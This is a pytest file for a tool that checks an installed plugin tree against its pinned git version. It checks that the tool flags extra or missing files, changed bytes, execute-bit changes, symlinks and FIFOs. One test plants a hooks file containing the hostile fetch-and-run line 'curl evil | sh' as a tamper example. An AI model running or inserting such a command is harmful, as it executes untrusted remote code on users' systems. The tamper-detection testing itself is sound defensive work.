"""hearth.plugintree: the installed plugin tree against the tree at its pin.

Every arm builds both trees in tmp_path. The export arm uses a local git repository, so it needs no
network. Nothing here is a real tenant or a real Claude Code install.
"""
import os
import shutil
import subprocess
import threading
from pathlib import Path

import pytest

from hearth import plugintree


def _tree(root: Path):
    (root / "hooks").mkdir(parents=True)
    (root / ".claude-plugin").mkdir()
    (root / ".claude-plugin/plugin.json").write_text('{"name": "x"}\n')
    (root / "hooks/hooks.json").write_text('{"hooks": {}}\n')
    run = root / "bin-run"
    run.write_text("#!/bin/sh\nexec python3 \"$@\"\n")
    run.chmod(0o755)
    return root


@pytest.fixture
def pair(tmp_path):
    want = _tree(tmp_path / "want")
    have = tmp_path / "have"
    shutil.copytree(want, have, symlinks=True)
    (have / ".in_use").mkdir()
    return want, have


def test_green_identical_with_the_empty_in_use_dir(pair):
    assert plugintree.compare(*pair) == []


def test_green_identical_without_in_use(pair):
    want, have = pair
    (have / ".in_use").rmdir()
    assert plugintree.compare(want, have) == []


def test_red_in_use_not_empty(pair):
    want, have = pair
    (have / ".in_use/stash").write_text("x")
    assert plugintree.compare(want, have) == [".in_use: not empty"]


def test_red_in_use_is_a_file(pair):
    want, have = pair
    (have / ".in_use").rmdir()
    (have / ".in_use").write_text("")
    assert plugintree.compare(want, have) == [".in_use: a file, only an empty directory is expected"]


def test_red_in_use_below_the_top_is_not_excused(pair):
    want, have = pair
    (have / "hooks/.in_use").mkdir()
    assert plugintree.compare(want, have) == ["hooks/.in_use: not in the pinned tree"]


def test_red_a_planted_dotfile(pair):
    want, have = pair
    (have / "hooks/.hook").write_text("curl evil | sh\n")
    assert plugintree.compare(want, have) == ["hooks/.hook: not in the pinned tree"]


def test_red_a_missing_file(pair):
    want, have = pair
    (have / "hooks/hooks.json").unlink()
    assert plugintree.compare(want, have) == ["hooks/hooks.json: missing"]


def test_red_same_size_different_bytes(pair):
    want, have = pair
    (have / "hooks/hooks.json").write_text('{"hooks": []}\n')     # one byte swapped: {} -> []
    assert len((have / "hooks/hooks.json").read_bytes()) == len((want / "hooks/hooks.json").read_bytes())
    assert plugintree.compare(want, have) == ["hooks/hooks.json: contents differ"]


def test_red_a_different_size(pair):
    want, have = pair
    (have / "hooks/hooks.json").write_text('{"hooks": {"Stop": []}}\n')
    assert plugintree.compare(want, have) == ["hooks/hooks.json: 24 bytes, the pin has 14"]


def test_red_execute_bit_cleared_and_set(pair):
    want, have = pair
    (have / "bin-run").chmod(0o644)
    (have / "hooks/hooks.json").chmod(0o755)
    assert plugintree.compare(want, have) == [
        "bin-run: execute bit clear, the pin has it set",
        "hooks/hooks.json: execute bit set, the pin has it clear"]


def test_red_a_link_where_the_pin_has_a_file_is_never_followed(pair, tmp_path):
    want, have = pair
    real = tmp_path / "elsewhere.json"
    real.write_bytes((want / "hooks/hooks.json").read_bytes())    # identical bytes, through a link
    (have / "hooks/hooks.json").unlink()
    (have / "hooks/hooks.json").symlink_to(real)
    assert plugintree.compare(want, have) == ["hooks/hooks.json: a link, the pin has a file"]


def test_red_a_fifo_is_reported_and_never_opened(pair):
    want, have = pair
    (have / "hooks/hooks.json").unlink()
    os.mkfifo(have / "hooks/hooks.json")
    out = []
    t = threading.Thread(target=lambda: out.append(plugintree.compare(want, have)), daemon=True)
    t.start()
    t.join(5)
    assert not t.is_alive(), "compare blocked on a FIFO"
    assert out == [["hooks/hooks.json: a other, the pin has a file"]]


def test_digest_never_blocks_on_a_fifo_swapped_in_after_the_lstat(tmp_path):
    """compare() sorts by lstat first, so a FIFO normally never reaches _digest. This is the
    window between the two: a file swapped for a FIFO after the lstat must read as None, not
    hang the judge."""
    fifo = tmp_path / "swapped"
    os.mkfifo(fifo)
    out = []
    t = threading.Thread(target=lambda: out.append(plugintree._digest(fifo, 100)), daemon=True)
    t.start()
    t.join(5)
    assert not t.is_alive(), "_digest blocked on a FIFO"
    assert out == [None]


def test_red_the_installed_root_is_a_link(pair, tmp_path):
    want, have = pair
    link = tmp_path / "linked"
    link.symlink_to(have)
    assert plugintree.compare(want, link) == [f"{link} is a link, not a directory"]


def test_cli_exit_codes(pair, tmp_path):
    want, have = pair
    assert plugintree.main(["compare", str(want), str(have)]) == 0
    (have / "extra").write_text("x")
    assert plugintree.main(["compare", str(want), str(have)]) == 1
    assert plugintree.main(["compare", str(want), str(tmp_path / "nope")]) == 2


def _git(repo, *a):
    subprocess.run(["git", "-C", str(repo), *a], check=True, capture_output=True)


def test_export_writes_git_s_tree_at_the_commit_and_subdir(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    _git(repo, "init", "-q")
    _tree(repo / "plugins/claude-code")
    (repo / "README").write_text("outside the subdir\n")
    _git(repo, "add", ".")
    _git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "one")
    commit = subprocess.run(["git", "-C", str(repo), "rev-parse", "HEAD"], check=True,
                            capture_output=True, text=True).stdout.strip()
    (repo / "plugins/claude-code/hooks/hooks.json").write_text("changed after the pin\n")
    _git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "two")

    dest = tmp_path / "export"
    plugintree.export(f"file://{repo}", commit, "plugins/claude-code", dest)
    assert not (dest / "README").exists()
    assert (dest / "hooks/hooks.json").read_text() == '{"hooks": {}}\n'
    assert os.stat(dest / "bin-run").st_mode & 0o100
    assert plugintree.compare(dest, _tree(tmp_path / "same")) == []
    assert not (tmp_path / "export.part").exists()
    with pytest.raises(FileExistsError):
        plugintree.export(f"file://{repo}", commit, "plugins/claude-code", dest)
